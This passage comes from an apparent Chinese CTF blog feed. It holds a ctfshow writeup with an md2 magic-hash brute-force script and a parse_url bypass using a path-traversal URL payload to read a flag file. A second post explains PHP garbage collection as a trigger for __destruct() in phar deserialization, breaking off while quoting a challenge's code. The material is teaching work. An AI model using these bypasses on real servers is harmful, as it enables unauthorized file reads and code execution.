<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$b = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'48399'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$c = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到结果<br><img src="https://img-blog.csdnimg.cn/24773c08bf7943759760909a91edf091.png" alt="2">b&#x3D;0e652024452&amp;c&#x3D;0e603448399</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'差点点就成功了！'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>filter_var函数：</p>
<blockquote>
<p>filter_var() 函数通过指定的过滤器过滤一个变量。</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"someone@example....com"</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码的输出如下所示：</p>
<blockquote>
<p>E-mail is not valid </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c283211f432e4879a0d9d4b1c9c5f153.png" alt="1"><a href="https://www.runoob.com/php/php-ref-filter.html">详情请见</a></p>
<p>php会将不认识的协议当成目录</p>
<blockquote>
<p>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;<br>打印Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F; )<br>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt<br>打印Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt ) ctfshow{91873400-0885-4a10-a7d9-75c9568f5e86} </p>
</blockquote>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>php的垃圾回收(GC)机制介绍以及在phar反序列化中的一些利用</title>
    <url>/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="php的垃圾回收-GC-机制介绍以及在phar反序列化中的一些利用"><a href="#php的垃圾回收-GC-机制介绍以及在phar反序列化中的一些利用" class="headerlink" title="php的垃圾回收(GC)机制介绍以及在phar反序列化中的一些利用"></a>php的垃圾回收(GC)机制介绍以及在phar反序列化中的一些利用</h2><h2 id="析构函数-destruct"><a href="#析构函数-destruct" class="headerlink" title="析构函数__destruct()"></a>析构函数__destruct()</h2><p>当一个程序结束后php会自动销毁，最后再调用一次<code>__destruct()</code>。也就是说创建了一个对象的话，程序结束后就会被销毁，在结束时会调用一次以上<code>__destruct()</code>。如果要触发<code>__destruct()</code>的话，要么对象为<code>null</code>,要么php的生命周期结束，要么给定的变量被unset()销毁。那么如果程序还没有运行结束的话，在运行中抛出异常或者程序报错则不会触发<code>__destruct()</code>，这里就要提到GC回收机制。</p>
<h2 id="GC机制官方文档"><a href="#GC机制官方文档" class="headerlink" title="GC机制官方文档"></a>GC机制<a href="https://www.php.net/manual/zh/features.gc.php">官方文档</a></h2><p>也就是垃圾回收机制，在php，python，java，c# 等中都有存在。</p>
<p>GC机制，能够销毁内存空间，防止内存溢出，在PHP中使用<strong>引用计数</strong>和<strong>回收周期</strong>来自动管理内存对象，当一个变量被设置为NULL或者没有指针指向时它就会变成垃圾被GC机制自动回收掉；当对象没有被引用时，也会被回收，在这个过程中，会自动调用对象中的<code>__destruct()</code>。</p>
<h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><p>每一个php变量存在一个叫做zval的变量容器，一个zval变量容器包含变量的类型和值，还包括两个字节的额外信息—<code>is_ref</code>和<code>refcount</code>。</p>
<p><code>is_ref</code>是个bool值，用来标识变量是否是引用集合，通过这个字节，php引擎才可以把普通变量和引用变量区分开来。php它允许用户通过<code>&amp;</code>来自定义引用，并且zval变量容器中还有一个内部引用计数机制用来优化内存的使用。</p>
<p><code>refcount</code>表示有多少个变量名指向zval容器，也就是指向这个zval变量容器的变量个数。</p>
<p>我们可以使用xdebug来检查引用计数的情况<br> <img src="https://img-blog.csdnimg.cn/32b4413f344d4a71bbdaed0f95532c0b.png" alt="1"></p>
<p>引用例子：</p>
<p>在php5.6.9下运行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//销毁$b,$c变量</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//引用变量</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在php5.6.9下运行得到结果</p>
<blockquote>
<p>a: (refcount&#x3D;3, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’&#x2F;&#x2F;b,b,c被销毁后就剩一个a指向zval容器a:(refcount&#x3D;2,isref&#x3D;1)&#x3D;′newstring′&#x2F;&#x2F;a指向zval容器a:(refcount&#x3D;2,isr​ef&#x3D;1)&#x3D;′newstring′&#x2F;&#x2F;b引用了a的地址，那么a的地址，那么b就是引用变量</p>
</blockquote>
<p>在php7.3.4下运行得到结果</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‘new string’&#x2F;&#x2F;b引用了b引用了a的地址，那么$b就是引用变量</p>
</blockquote>
<p>注意：</p>
<p>在php7开始，$c &#x3D; $b &#x3D; $a之后a的引用变量也是1。</p>
<p>在PHP 7中，zval可以被引用计数或不被引用，在zval结构中有一个标志确定了这一点。</p>
<p>①对于null，bool，int和double的类型变量，refcount不会计数；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'b'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'d'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1.1</p>
<p>refcount值都为0</p>
</blockquote>
<p>php5.6.9运行结果</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1.1</p>
<p>refcount值都为1</p>
</blockquote>
<p>②对于对象，refcount计数和php5的<strong>一致</strong>；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">sd</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘1’ }</p>
</blockquote>
<p>php5.6.9运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘1’ }</p>
<p>可以发现，两个refcount结果一样</p>
</blockquote>
<p>③对于字符串;</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‘new string’</p>
</blockquote>
<p>php5.6.9运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‘new string’</p>
</blockquote>
<p>④对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span><span class="token comment">//数组值改变以后，之前的引用全部废弃，重新计算</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>c: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘a’, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘b’)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘a’, 1  &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘b’, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘c’)</p>
</blockquote>
<p>php5.6.9运行结果：</p>
<blockquote>
<p>c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘a’, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘b’)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘a’, 1  &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘b’, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘c’)</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/22e913ea4a704047b26b0700fbfbafba.png" alt="1"></p>
<h3 id="回收周期"><a href="#回收周期" class="headerlink" title="回收周期"></a>回收周期</h3><p>php的垃圾回收机制是默认打开的，在php.ini中可以修改它<code>zend.enable_gc</code>，或者在运行php时分别调用gc_enable() 和 gc_disable()函数来打开和关闭垃圾回收机制。</p>
<p><img src="https://img-blog.csdnimg.cn/612b08fded7346268103c89b188ad14a.png" alt="请添加图片描述"></p>
<p>首先，需要确立一些基本规则。如果 refcount <strong>增加</strong>，则该变量仍在使用中，因此不是垃圾。如果 refcount    <strong>减少到 0</strong>，则 zval 可以释放。这意味着只有当引用计数参数减少到非零值时，才能创建垃圾循环。其次，在垃圾循环中，可以通过检查是否可以将 refcount 减少 1，并检查哪些    zval 的 refcount 为 0 来确定哪些部分是垃圾。</p>
<h2 id="GC机制的实际工作"><a href="#GC机制的实际工作" class="headerlink" title="GC机制的实际工作"></a>GC机制的实际工作</h2><p>那么GC回收机制在ctf中该怎么利用呢？上面说到PHP的魔术方法<code>__destruct()</code>函数在程序结束后会自动调用<code>__destruct()</code>函数进行自动销毁，但是程序报错或者异常终止就不会触发该函数。</p>
<p>一段代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直接new一个对象创建类，并没有进行指向</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//程序运行结束后会销毁所有对象，就会触发__destruct();</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/96d1a112806f4e149dede4669e5697b4.png" alt="请添加图片描述"></p>
<p>从运行的结果可以看到1就直接触发<code>__destrcut()函数</code>被当作垃圾给回收了。而1和2则是在创建完之后没有操作了才正常结束。</p>
<p>那么如果正常指向，然后后面再指向对象的时候忽然指向其他的，就是舍弃对象，那么又会发生什么呢？</p>
<p>一段代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//舍弃对象</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/10a042c5408c40bdb0b228566880b9f3.png" alt="请添加图片描述"><br> 对象czy被new了之后却被赋值为4，也就是new czy(1)执行是NULL，触发<code>__destruct()</code>当成垃圾被回收，也就成功执行了<code>__destruct()</code>里的语句，这是一个可用点。</p>
<p>如果我们注释掉<code>$c[0]=$c[1];//舍弃对象</code>：<br> <img src="https://img-blog.csdnimg.cn/f4192d1071814468b09e4daffcbf8377.png" alt="请添加图片描述"></p>
<p>拿着就是正常创建，正常销毁。</p>
<h2 id="结合题目"><a href="#结合题目" class="headerlink" title="结合题目"></a>结合题目</h2><p>这里我选了一个比较典型的题目<strong>NSSCTF prize_p1</strong><a href="https://www.ctfer.vip/problem/14">题目地址</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
